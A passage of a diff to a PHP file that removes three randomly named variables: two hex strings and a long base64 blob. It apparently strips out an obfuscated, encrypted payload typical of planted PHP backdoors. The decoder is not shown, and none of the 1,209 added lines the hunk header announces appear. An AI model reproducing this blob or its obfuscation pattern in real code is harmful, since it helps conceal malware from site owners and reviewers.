@@ -1,24 +1,1209 @@
 <?php
-$iedglqhqz="1eacd6ac69b3a7bf682cac629f62b87d";
-$ohvultpfnfu="045602555d505702015a5b0202525b55015c5350500704020c00040b5b5b515c";
-$pqpbmbfyfy="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